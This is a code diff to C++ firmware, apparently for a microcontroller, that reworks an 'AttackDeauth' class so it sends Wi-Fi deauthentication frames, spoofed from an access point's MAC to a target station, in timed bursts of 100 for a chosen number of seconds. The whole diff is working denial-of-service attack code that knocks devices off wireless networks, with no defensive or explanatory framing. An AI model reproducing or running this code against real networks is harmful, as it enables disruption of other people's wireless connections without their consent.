@@ -1,6 +1,11 @@
 #include "Networks/Attacks/AttackDeauth.h"
 
-const int SEND_PACKET_DELAY = 10;
+#define SEND_PACKET_DELAY 1
+#define SEND_BURST_DELAY 500
+#define PACKETS_PER_BURST 100
+
+const unsigned int ONE_CYCLE_BURST_SENDING =
+    (SEND_PACKET_DELAY * PACKETS_PER_BURST + SEND_BURST_DELAY) + 1;
 
 AttackDeauth::AttackDeauth(const MacAddress& sourceAP, const MacAddress& targetSTA){
     state.status = attack_status_t::Idle;
@@ -12,30 +17,21 @@ AttackDeauth::AttackDeauth(const MacAddress& sourceAP, const MacAddress& targetS
     memcpy(frame.station, targetSTA.bytes, 6);
 }
 
-void AttackDeauth::start(int times){
+void AttackDeauth::start(unsigned int seconds){
     state.status = attack_status_t::Running;
 
-    // unsigned long lastSendTime, now = millis();
-    // int i = 0;
+    Serial.println("Sending");
 
-    // while (i < times)
-    // {
-    //     now = millis();
-    //     if(now - lastSendTime >= SEND_PACKET_DELAY){
-    //         sendDeauthFrame();
-    //         Serial.println("Send");
-    //         lastSendTime = now;
-    //         i++;
-    //     }
-    // }
-    
-    for(int i = 0; i < times/100; i++){
-        for(int j = 0; j < 100; j++){
+    // one cycle = 100ms (burst) + 500ms (delay) = 600ms
+    unsigned int times = seconds * 1000 / ONE_CYCLE_BURST_SENDING + 1; // 
+
+    for(int i = 0; i < times; i++){
+        for(int j = 0; j < PACKETS_PER_BURST; j++){
             sendDeauthFrame();
-            Serial.println("Send");
-            delay(1);
+            delay(SEND_PACKET_DELAY);
         }
-        delay(1000);
+        Serial.print(".");
+        delay(SEND_BURST_DELAY);
     }
 
     state.status = attack_status_t::Completed;
